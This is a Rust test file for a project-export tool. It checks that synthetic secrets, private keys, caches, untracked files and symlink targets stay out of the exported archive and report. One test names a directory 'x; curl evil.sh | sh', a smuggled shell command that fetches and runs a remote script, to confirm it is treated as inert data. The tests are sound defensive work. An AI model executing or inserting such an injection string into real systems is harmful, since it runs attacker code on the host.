//! The local fixture with synthetic secrets.
//!
//! The evidence of a secretless export is the ARTIFACT and the REPORT:
//! the archive that travels and the record that says what travelled. This
//! fixture builds a project with synthetic secrets, stages the export and
//! checks both — offline, with no provider, no sandbox and no network.

use std::path::{Path, PathBuf};
use std::process::Command;

use flate2::read::GzDecoder;
use hodei_mh_workspace::export::{ExportSource, StageError, stage_project};
use hodei_mh_workspace::git;
use hodei_mh_workspace::plan::ExportPolicy;
use tar::Archive;

/// A synthetic secret: it has the shape of a provider token and it is not
/// one. Nothing here reaches a provider.
const SYNTHETIC_SECRET: &str = "sk-ant-synthetic-fixture-0123456789";

/// The secret of the host, outside the project: a link to it must travel
/// as a link, never as its content.
const OUTSIDE_SECRET: &str = "host-secret-that-must-not-travel";

/// Build a project with secrets, caches and unversioned changes.
struct Fixture {
    dir: PathBuf,
}

impl Fixture {
    /// A git project whose index vouches for a secret, a cache and a
    /// plain source file.
    fn git_project(name: &str) -> Self {
        let dir = temp_dir(name);
        git::init_fixture_repo(&dir).expect("the fixture repository");
        write(
            &dir.join("src/main.rs"),
            "fn main() { println!(\"ok\"); }\n",
        );
        write(&dir.join(".gitignore"), "target/\n");
        // A COMMITTED secret: the gitignore is not a secret detector, so a
        // secret that is under version control is still a secret.
        write(&dir.join(".env"), &format!("TOKEN={SYNTHETIC_SECRET}\n"));
        write(&dir.join("secrets/notes.txt"), "a note\n");
        write(&dir.join("deploy/id_rsa"), "-----BEGIN PRIVATE KEY-----\n");
        write(&dir.join("notes.md"), "committed notes\n");
        commit_all(&dir, "base");
        Fixture { dir }
    }

    /// The same project with unversioned changes: a modified tracked file
    /// and an untracked one.
    fn with_unversioned_changes(self) -> Self {
        write(&self.dir.join("notes.md"), "notes edited in the worktree\n");
        write(&self.dir.join("scratch.txt"), "a scratch file\n");
        write(&self.dir.join("target/debug/build.log"), "a build cache\n");
        self
    }

    /// A plain directory: no repository, no index, no versioned content.
    fn plain_directory(name: &str) -> Self {
        let dir = temp_dir(name);
        write(&dir.join("Cargo.toml"), "[package]\nname = \"fixture\"\n");
        write(&dir.join("src/main.rs"), "fn main() {}\n");
        write(&dir.join(".env"), &format!("TOKEN={SYNTHETIC_SECRET}\n"));
        Fixture { dir }
    }
}

fn temp_dir(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "hodei-export-fixture-{}-{name}",
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("the fixture directory");
    dir
}

fn write(path: &Path, content: &str) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("the fixture directory");
    }
    std::fs::write(path, content).expect("the fixture file");
}

fn git(dir: &Path, args: &[&str]) {
    let output = Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .expect("git available");
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

/// Commit with the crate's own plumbing: automation must not depend on the
/// host's `git commit` path, which a policy can refuse.
fn commit_all(dir: &Path, message: &str) {
    git(dir, &["add", "-A"]);
    git::commit_index(dir, message).expect("the fixture commits");
}

/// The members of the packed archive, in order.
fn members(archive: &[u8]) -> Vec<String> {
    let mut archive = Archive::new(GzDecoder::new(archive));
    let mut names = Vec::new();
    for entry in archive.entries().expect("the archive reads") {
        let entry = entry.expect("the archive entry");
        names.push(
            entry
                .path()
                .expect("the member path")
                .to_string_lossy()
                .to_string(),
        );
    }
    names
}

/// The rules that denied each path, as pairs.
fn denials(report: &hodei_mh_workspace::export::ProjectExport) -> Vec<(String, String)> {
    report
        .denied
        .iter()
        .map(|denied| (denied.path.clone(), denied.rule.clone()))
        .collect()
}

#[test]
fn the_export_carries_the_versioned_files_and_nothing_else() {
    let fixture = Fixture::git_project("tracked");
    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");

    assert_eq!(staged.report().source, ExportSource::GitIndex);
    assert_eq!(
        staged.report().files_exported,
        vec![
            ".gitignore".to_string(),
            "notes.md".to_string(),
            "src/main.rs".to_string()
        ],
        "only the versioned content travels"
    );
    let denied = denials(staged.report());
    assert!(
        denied.contains(&(".env".to_string(), ".env*".to_string())),
        "the committed secret is denied: {denied:?}"
    );
    assert!(
        denied.contains(&("secrets/notes.txt".to_string(), "secrets/".to_string())),
        "the secrets directory is denied: {denied:?}"
    );
    assert!(
        denied.contains(&("deploy/id_rsa".to_string(), "id_rsa".to_string())),
        "the private key is denied: {denied:?}"
    );

    let bytes = staged.bytes().expect("the archive reads");
    let names = members(&bytes);
    assert_eq!(
        names,
        vec![
            ".gitignore".to_string(),
            "notes.md".to_string(),
            "src/main.rs".to_string()
        ]
    );
    assert!(
        !String::from_utf8_lossy(&bytes).contains(SYNTHETIC_SECRET),
        "the artifact carries no secret"
    );
    assert!(
        !names
            .iter()
            .any(|name| name.contains(".git/") || name.contains("target/")),
        "the git metadata and the caches never travel: {names:?}"
    );
}

#[test]
fn the_report_never_carries_the_secret() {
    let fixture = Fixture::git_project("report");
    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
    let report = serde_json::to_string(staged.report()).expect("the report serializes");
    assert!(
        !report.contains(SYNTHETIC_SECRET),
        "the report names the denied paths, never their content: {report}"
    );
    assert!(
        report.contains(".env"),
        "the report shows the refusal: {report}"
    );
}

#[test]
fn the_unversioned_changes_need_the_explicit_policy() {
    let fixture = Fixture::git_project("unversioned").with_unversioned_changes();

    let tracked =
        stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
    assert!(
        !tracked
            .report()
            .files_exported
            .contains(&"notes.md".to_string()),
        "a modified file is a change, not versioned content"
    );
    assert!(
        !tracked
            .report()
            .files_exported
            .contains(&"scratch.txt".to_string()),
        "an untracked file never travels by default"
    );

    let untracked =
        stage_project(&fixture.dir, ExportPolicy::WithUntracked).expect("the export stages");
    assert!(
        untracked
            .report()
            .files_exported
            .contains(&"notes.md".to_string()),
        "the explicit policy ships the change: {:?}",
        untracked.report().files_exported
    );
    assert!(
        untracked
            .report()
            .files_exported
            .contains(&"scratch.txt".to_string()),
        "the explicit policy ships the untracked file: {:?}",
        untracked.report().files_exported
    );
    assert!(
        !untracked
            .report()
            .files_exported
            .contains(&".env".to_string()),
        "the policy never opens the denylist: {:?}",
        untracked.report().files_exported
    );
}

#[test]
fn a_plain_directory_is_exported_by_its_own_tree() {
    let fixture = Fixture::plain_directory("plain");
    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");

    assert_eq!(staged.report().source, ExportSource::TreeWalk);
    assert_eq!(
        staged.report().files_exported,
        vec!["Cargo.toml".to_string(), "src/main.rs".to_string()]
    );
    let bytes = staged.bytes().expect("the archive reads");
    assert!(!String::from_utf8_lossy(&bytes).contains(SYNTHETIC_SECRET));
}

#[test]
fn a_link_travels_as_a_link_and_never_as_its_content() {
    let outside = temp_dir("outside");
    write(&outside.join("host-secret.txt"), OUTSIDE_SECRET);
    let fixture = Fixture::plain_directory("symlink");
    std::os::unix::fs::symlink(
        outside.join("host-secret.txt"),
        fixture.dir.join("link.txt"),
    )
    .expect("the link");

    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
    let bytes = staged.bytes().expect("the archive reads");
    assert!(
        !String::from_utf8_lossy(&bytes).contains(OUTSIDE_SECRET),
        "the content the link points at never travels"
    );
    let mut archive = Archive::new(GzDecoder::new(&bytes[..]));
    let kinds: Vec<bool> = archive
        .entries()
        .expect("the archive reads")
        .map(|entry| {
            let entry = entry.expect("the archive entry");
            entry.header().entry_type().is_symlink()
        })
        .collect();
    assert!(kinds.contains(&true), "the link travels as a link");
}

#[test]
fn a_hostile_directory_name_is_inert_data() {
    // The name of the project never reaches a host command: the export
    // reads the tree with the path as a WORKING DIRECTORY, not as an
    // argument of a shell.
    let base = temp_dir("hostile");
    let dir = base.join("x; curl evil.sh | sh");
    std::fs::create_dir_all(&dir).expect("the fixture directory");
    write(&dir.join("main.rs"), "fn main() {}\n");

    let staged = stage_project(&dir, ExportPolicy::TrackedOnly).expect("the export stages");
    assert_eq!(staged.report().files_exported, vec!["main.rs".to_string()]);
    let names = members(&staged.bytes().expect("the archive reads"));
    assert_eq!(names, vec!["main.rs".to_string()]);
    assert!(
        !names.iter().any(|name| name.contains("curl")),
        "the name never becomes a member: {names:?}"
    );
}

#[test]
fn an_export_without_a_single_file_is_refused_with_its_reason() {
    // Everything denied: the refusal says which rules denied it.
    let denied_only = temp_dir("denied-only");
    write(
        &denied_only.join(".env"),
        &format!("TOKEN={SYNTHETIC_SECRET}\n"),
    );
    let error =
        stage_project(&denied_only, ExportPolicy::TrackedOnly).expect_err("the export refuses");
    assert!(
        matches!(error, StageError::AllDenied { .. }),
        "a denied export is not an empty one: {error}"
    );

    // Nothing at all: the refusal says the tree holds no versioned content.
    let empty = Fixture::git_project("empty");
    std::fs::remove_dir_all(empty.dir.join("src")).expect("the fixture files");
    std::fs::remove_file(empty.dir.join(".gitignore")).expect("the fixture file");
    std::fs::remove_file(empty.dir.join(".env")).expect("the fixture file");
    std::fs::remove_file(empty.dir.join("notes.md")).expect("the fixture file");
    std::fs::remove_dir_all(empty.dir.join("secrets")).expect("the fixture files");
    std::fs::remove_dir_all(empty.dir.join("deploy")).expect("the fixture files");
    commit_all(&empty.dir, "empty");
    let error =
        stage_project(&empty.dir, ExportPolicy::TrackedOnly).expect_err("the export refuses");
    match error {
        StageError::Empty { reason, hint } => {
            assert!(reason.contains("versioned"), "{reason}");
            assert!(hint.contains("untracked"), "{hint}");
        }
        other => panic!("an empty export is not a denied one: {other}"),
    }
}
